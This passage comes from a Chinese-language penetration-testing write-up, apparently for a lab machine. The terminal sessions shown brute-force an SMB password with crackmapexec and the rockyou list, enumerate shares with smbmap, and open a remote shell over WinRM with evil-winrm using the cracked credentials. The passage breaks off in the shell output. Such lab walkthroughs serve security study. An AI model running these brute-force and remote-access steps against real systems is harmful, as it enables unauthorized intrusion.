class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> =============================( Enumerating Workgroup/Domain on 10.0.3.29 )=============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> =================================( Nbtstat Information <span class="keyword">for</span> 10.0.3.29 )=================================</span><br><span class="line"></span><br><span class="line">Looking up status of 10.0.3.29</span><br><span class="line">        WIN-IURF14RBVGV &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        WIN-IURF14RBVGV &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line"></span><br><span class="line">        MAC Address = 08-00-27-6C-C0-01</span><br><span class="line"></span><br><span class="line"> =====================================( Session Check on 10.0.3.29 )=====================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[E] Server doesn<span class="string">&#x27;t allow session using username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;.  Aborting remainder of tests.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>拿 80 得到的 <code>nica</code> 尝试爆破</p>
<p>medusa 和 hydra 不能正常爆破【why?】</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># medusa -M smbnt -h 10.0.3.29 -u nica -P rockyou.txt -e ns -F </span></span><br><span class="line">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;</span><br><span class="line"></span><br><span class="line">ERROR: SMB Protocol Negotiation Failed with host: 10.0.3.29</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># hydra -l nica -P rockyou.txt 10.0.3.29 smb     </span></span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-16 22:30:56</span><br><span class="line">[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)</span><br><span class="line">[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task</span><br><span class="line">[DATA] attacking smb://10.0.3.29:445/</span><br><span class="line">[ERROR] invalid reply from target smb://10.0.3.29:445/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>crackmapexec 可正常爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># crackmapexec smb 10.0.3.29 -u nica -p rockyou.txt </span></span><br><span class="line">[*] First time use detected</span><br><span class="line">[*] Creating home directory structure</span><br><span class="line">[*] Creating default workspace</span><br><span class="line">[*] Initializing RDP protocol database</span><br><span class="line">[*] Initializing WINRM protocol database</span><br><span class="line">[*] Initializing LDAP protocol database</span><br><span class="line">[*] Initializing SSH protocol database</span><br><span class="line">[*] Initializing MSSQL protocol database</span><br><span class="line">[*] Initializing SMB protocol database</span><br><span class="line">[*] Initializing FTP protocol database</span><br><span class="line">[*] Copying default configuration file</span><br><span class="line">[*] Generating SSL certificate</span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:123456 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:12345 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:123456789 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:password STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:iloveyou STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:princess STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:1234567 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:rockyou STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:12345678 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:abc123 STATUS_LOGON_FAILURE</span><br><span class="line">……………………</span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:ilovegod STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:hawaii STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:sparkle STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:kristina STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:sexymama STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:crazy STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:valerie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:spencer STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:scarface STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore </span><br></pre></td></tr></table></figure>
<p>得 <code>nica:hardcore</code></p>
<p>利用 <code>smbmap</code> 收集共享信息，可见 <code>IPC$</code>
可读</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># smbmap -u &#x27;nica&#x27; -p &#x27;hardcore&#x27; -H 10.0.3.29</span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          </span><br><span class="line">                                                                                                                             </span><br><span class="line">[+] IP: 10.0.3.29:445   Name: 10.0.3.29                 Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Admin remota</span><br><span class="line">        C$                                                      NO ACCESS       Recurso predeterminado</span><br><span class="line">        IPC$                                                    READ ONLY       IPC remota</span><br><span class="line">[*] Closed 1 connections                 </span><br></pre></td></tr></table></figure>
<p>查看 <code>IPC$</code> 目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># smbmap -u &#x27;nica&#x27; -p &#x27;hardcore&#x27; -H 10.0.3.29 -r &#x27;IPC$&#x27; </span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      </span><br><span class="line">                                                                                                                             </span><br><span class="line">[+] IP: 10.0.3.29:445   Name: 10.0.3.29                 Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Admin remota</span><br><span class="line">        C$                                                      NO ACCESS       Recurso predeterminado</span><br><span class="line">        IPC$                                                    READ ONLY       IPC remota</span><br><span class="line">        ./IPC$</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-304-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1b0-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-3a0-0</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-234-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-3d4-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-470-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-220-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER</span><br><span class="line">[*] Closed 1 connections      </span><br></pre></td></tr></table></figure>
<p>下载文件示例</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># smbmap -u &#x27;nica&#x27; -p &#x27;hardcore&#x27; -H 10.0.3.29 --download &#x27;IPC$\lsass&#x27; </span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      </span><br><span class="line">[+] Starting download: IPC$\lsass (4 bytes)                                                                              </span><br><span class="line">[+] File output to: /root/Desktop/10.0.3.29-IPC_lsass</span><br><span class="line">[*] Closed 1 connections                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># smbmap -u &#x27;nica&#x27; -p &#x27;hardcore&#x27; -H 10.0.3.29 --download &#x27;IPC$\ntsvcs&#x27; </span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      </span><br><span class="line">[+] Starting download: IPC$\ntsvcs (3 bytes)                                                                             </span><br><span class="line">[+] File output to: /root/Desktop/10.0.3.29-IPC_ntsvcs</span><br><span class="line">[*] Closed 1 connections                                                                                                     </span><br><span class="line">                                 </span><br></pre></td></tr></table></figure>
<p>本地读取发现文件是空的没啥用！</p>
<h3 id="winrm">1.5. WinRM</h3>
<p>WinRM 基本介绍</p>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://book.hacktricks.xyz/cn/network-services-pentesting/5985-5986-pentesting-winrm">5985,5986
- Pentesting WinRM | HackTricks</a><br />
<a
target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx">Windows
远程管理 (WinRM)</a> 被微软强调为一种 <strong>协议</strong>，它通过
HTTP(S) 实现 <strong>Windows 系统的远程管理</strong>，并在此过程中利用
SOAP。它基本上由 WMI 提供支持，呈现为 WMI 操作的基于 HTTP 的接口。<br />
简言之，WinRM 在机器上的存在允许通过 PowerShell
进行简单的远程管理，类似于 SSH 在其他操作系统中的工作方式。要确定 WinRM
是否正常运行，建议检查特定端口的开放情况：</p>
<ul>
<li>5985/tcp (HTTP)<br />
</li>
<li>5986/tcp (HTTPS)</li>
</ul>
<p>上述列表中的开放端口表示 WinRM
已被设置，从而允许尝试启动远程会话。</p>
</blockquote>
<p>Linux 下的利用工具</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.kali.org/tools/evil-winrm/">Evil-Winrm | Kali
Linux Tools</a><br />
Windows远程管理（WinRM，Windows Remote Management）是 WS 管理协议的
Microsoft 实施，该协议是基于标准
SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。而微软将其包含在他们的系统中，是为了便于系统管理员在日常工作中，远程管理服务器，或通过脚本同时管理多台服务器，以提高他们的工作效率。<br />
该程序（工具）可以在任何启用了此功能的 Microsoft Windows Server
上使用（通常在端口
5985），当然，前提是您拥有使用它的凭据和权限。因此，它可以用于漏洞利用后的黑客攻击/渗透测试阶段。该程序的目的是为黑客攻击提供良好且易于使用的功能。系统管理员也可以将其用于合法目的，但其大部分功能都集中在黑客攻击/渗透测试上。</p>
</blockquote>
<p>经测 evil-winrm 利用前面爆破得到的 <code>nica:hardcore</code>
可成功连接 WinRM 并获得 Shell</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 Shell</h3>
<p>Kali 利用 evil-winrm 连接 WinRM 并获取 Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># evil-winrm -i 10.0.3.29 -u &#x27;nica&#x27; -p &#x27;hardcore&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\Documents&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\Documents&gt; ipconfig /all</span><br><span class="line"></span><br><span class="line">Configuraci¢n IP de Windows</span><br><span class="line"></span><br><span class="line">   Nombre de host. . . . . . . . . : WIN-IURF14RBVGV</span><br><span class="line">   Sufijo DNS principal  . . . . . :</span><br><span class="line">   Tipo de nodo. . . . . . . . . . : h¡brido</span><br><span class="line">   Enrutamiento IP habilitado. . . : no</span><br><span class="line">   Proxy WINS habilitado . . . . . : no</span><br><span class="line"></span><br><span class="line">Adaptador de Ethernet Ethernet:</span><br><span class="line"></span><br><span class="line">   Sufijo DNS espec¡fico para la conexi¢n. . :</span><br><span class="line">   Descripci¢n . . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter</span><br><span class="line">   Direcci¢n f¡sica. . . . . . . . . . . . . : 08-00-27-6C-C0-01</span><br><span class="line">   DHCP habilitado . . . . . . . . . . . . . : s¡</span><br><span class="line">   Configuraci¢n autom tica habilitada . . . : s¡</span><br><span class="line">   Direcci¢n IPv6 . . . . . . . . . . : fd17:625c:f037:3:d99b:91f6:4764:69fd(Preferido)</span><br><span class="line">   V¡nculo: direcci¢n IPv6 <span class="built_in">local</span>. . . : fe80::d99b:91f6:4764:69fd%5(Preferido)</span><br><span class="line">   Direcci¢n IPv4. . . . . . . . . . . . . . : 10.0.3.29(Preferido)</span><br><span class="line">   M scara de subred . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Concesi¢n obtenida. . . . . . . . . . . . : mi‚rcoles, 16 de octubre de 2024 20:35:53</span><br><span class="line">   La concesi¢n expira . . . . . . . . . . . : jueves, 17 de octubre de 2024 17:46:05</span><br><span class="line">   Puerta de enlace predeterminada . . . . . : fe80::5054:ff:fe12:3500%5</span><br><span class="line">                                       10.0.3.1</span><br><span class="line">   Servidor DHCP . . . . . . . . . . . . . . : 10.0.3.3</span><br><span class="line">   IAID DHCPv6 . . . . . . . . . . . . . . . : 84410407</span><br><span class="line">   DUID de cliente DHCPv6. . . . . . . . . . : 00-01-00-01-2E-A1-BC-E5-08-00-27-6C-C0-01</span><br><span class="line">   Servidores DNS. . . . . . . . . . . . . . : 192.168.1.1</span><br><span class="line">   NetBIOS sobre TCP/IP. . . . . . . . . . . : habilitado</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\Documents&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\Documents&gt; <span class="built_in">whoami</span> /all</span><br><span class="line"></span><br><span class="line">INFORMACIàN DE USUARIO</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Nombre de usuario    SID</span><br><span class="line">==================== ==============================================</span><br><span class="line">win-iurf14rbvgv\nica S-1-5-21-2519875556-2276787807-2868128514-1000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACIàN DE GRUPO</span><br><span class="line">--------------------</span><br><span class="line"></span><br><span class="line">Nombre de grupo                              Tipo           SID          Atributos</span><br><span class="line">============================================ ============== ============ ========================================================================</span><br><span class="line">Todos                                        Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">BUILTIN\Usuarios                             Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">BUILTIN\Usuarios de administraci¢n remota    Alias          S-1-5-32-580 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\NETWORK                         Grupo conocido S-1-5-2      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Esta compa¤¡a                   Grupo conocido S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Cuenta <span class="built_in">local</span>                    Grupo conocido S-1-5-113    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Autenticaci¢n NTLM              Grupo conocido S-1-5-64-10  Grupo 